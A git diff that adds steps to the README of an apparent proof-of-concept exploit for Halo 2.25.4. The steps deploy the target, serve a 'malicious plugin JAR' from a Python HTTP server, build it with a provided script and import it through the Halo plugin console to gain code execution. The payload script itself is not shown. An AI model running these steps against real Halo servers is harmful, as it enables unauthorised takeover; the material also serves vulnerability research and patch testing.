@@ -1,4 +1,12 @@
 # halo-2.25.4-exp
+Deploy Halo 2.25.4 using Docker or Docker Compose
+Hosting with a simple Python HTTP server
+python3 -m http.server 9999
+JAR access address: http://<your IP>:9999/poc-plugin.jar
+Build a malicious plugin JAR：
+cd halo-rce-poc
+chmod +x build-plugin.sh
+./build-plugin.sh
 导入插件：http://192.168.49.128:8090/console/plugins
 <img width="692" height="506" alt="image" src="https://github.com/user-attachments/assets/4282b8bb-a110-4708-bcca-13c0279abe2b" />
 
